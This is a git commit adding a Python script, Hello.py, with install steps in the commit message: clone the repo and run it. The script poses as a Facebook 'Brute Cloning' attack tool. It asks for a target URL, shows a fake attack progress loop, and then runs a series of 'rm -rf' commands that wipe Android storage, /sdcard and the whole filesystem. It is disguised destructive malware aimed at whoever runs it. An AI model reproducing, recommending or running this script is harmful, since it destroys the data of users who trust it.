3d3d7a1d8dbbcd3b2374a575799cbda03987dc37
$202 <114320201+force-202@users.noreply.github.com>
2022-11-04 17:24:34 +0800

    Add files via upload
    rm -rf brute
    git clone https://github.com/force-202/brute.git
    cd brute
    python Hello.py

---
+++ Hello.py
@@ -0,0 +1,43 @@
+import os
+
+os.system('clear')
+
+print(50*'\033[1;32m_')
+print('''\033[1;31m
+ 
+ ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████    
+▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    
+▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███      
+▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    
+░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒   
+░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   
+▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░   
+ ░    ░   ░░   ░  ░░░ ░ ░   ░         ░      
+ ░         ░        ░                 ░  ░   
+      ░               
+      
+    [•]Tool name: Brute Cloning
+    [•]Created by: M4.$!Lent
+    [•]Team Group: Aurelio Blood
+''') 
+print(50*'\033[1;32m_')
+
+input("[•] target facebook url: ")
+input("[•] treads: ")
+
+print(50*'_')
+
+print("starting attack")
+ 
+for y in range (10000000):
+	print("[*] attack status ===> ",y," sec left ")
+ddos = input(" attack done press enter or type exit;  ")
+ 
+ 
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
